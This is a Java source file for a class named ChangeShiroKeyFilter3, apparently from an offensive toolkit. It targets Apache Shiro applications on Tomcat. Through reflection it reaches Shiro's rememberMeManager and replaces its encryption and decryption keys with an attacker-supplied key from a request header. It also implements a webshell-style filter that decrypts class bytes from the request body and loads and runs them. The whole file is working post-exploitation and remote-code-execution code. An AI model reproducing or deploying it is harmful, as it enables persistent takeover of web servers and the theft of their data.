package com.summersec.x;

import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;

import javax.crypto.Cipher;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/**
 * 在 {@link ChangeShiroKeyFilter} 基础上，按多个常见 Filter 注册名依次匹配（filterConfigs）。
 */
public class ChangeShiroKeyFilter3 extends ClassLoader implements Filter {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String Pwd = "FcoRsBKe9XB3zOHbxTG0Lw==";
    public String path = "/favicondemo.ico";

    private static final String[] FILTER_CONFIG_NAMES = {
            "shiroFilterFactoryBean",
            "shiroFilter",
            "ShiroFilterFactoryBean",
            "springShiroFilter"
    };

    public ChangeShiroKeyFilter3() {
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public ChangeShiroKeyFilter3(ClassLoader c) {
        super(c);
    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain filterChain) throws IOException, ServletException {
        HttpSession session = ((HttpServletRequest) req).getSession();
        Object lastRequest = req;
        Object lastResponse = resp;
        if (!(lastRequest instanceof RequestFacade)) {
            try {
                Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                lastRequest = getRequest.invoke(req);
                while (true) {
                    if (lastRequest instanceof RequestFacade) {
                        break;
                    }
                    lastRequest = getRequest.invoke(lastRequest);
                }
            } catch (Exception e) {
            }
        }
        try {
            if (!(lastResponse instanceof ResponseFacade)) {
                Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                lastResponse = getResponse.invoke(resp);
                while (true) {
                    if (lastResponse instanceof ResponseFacade) {
                        break;
                    }
                    lastResponse = getResponse.invoke(lastResponse);
                }
            }
        } catch (Exception e) {
        }

        Map obj = new HashMap();
        obj.put("request", lastRequest);
        obj.put("response", lastResponse);
        obj.put("session", session);

        try {
            session.putValue("u", this.Pwd);
            Cipher c = Cipher.getInstance("AES");
            (new ChangeShiroKeyFilter3(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

    public String addFilter() throws Exception {
        org.apache.tomcat.util.threads.TaskThread thread = (org.apache.tomcat.util.threads.TaskThread) Thread.currentThread();
        java.lang.reflect.Field field = thread.getClass().getSuperclass().getDeclaredField("contextClassLoader");
        field.setAccessible(true);
        Object obj = field.get(thread);
        field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("resources");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getDeclaredField("context");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getSuperclass().getDeclaredField("filterConfigs");
        field.setAccessible(true);
        obj = field.get(obj);
        HashMap<String, Object> objMap = (HashMap<String, Object>) obj;

        for (String filterKey : FILTER_CONFIG_NAMES) {
            Iterator<Map.Entry<String, Object>> entries = objMap.entrySet().iterator();
            while (entries.hasNext()) {
                Map.Entry<String, Object> entry = entries.next();
                if (entry.getKey().equals(filterKey)) {
                    obj = entry.getValue();
                    field = obj.getClass().getDeclaredField("filter");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
                    byte[] bytes = this.base64Decode(this.Pwd);
                    setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
                    Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
                    setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
                    return "change key ok";
                }
            }
        }
        return "no shiro filter matched (filterConfigs)";
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = this.request.getHeader("p");
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append(var7.getMessage());
        }

        try {
            this.response.getWriter().println(tag_s + output + tag_e);
            this.response.getWriter().println(this.Pwd);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) ((Object[]) obj);
            this.request = (HttpServletRequest) data[0];
            this.response = (HttpServletResponse) data[1];
            this.Pwd = this.request.getHeader("p");
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest) obj;
                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest) req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse) resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse) this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
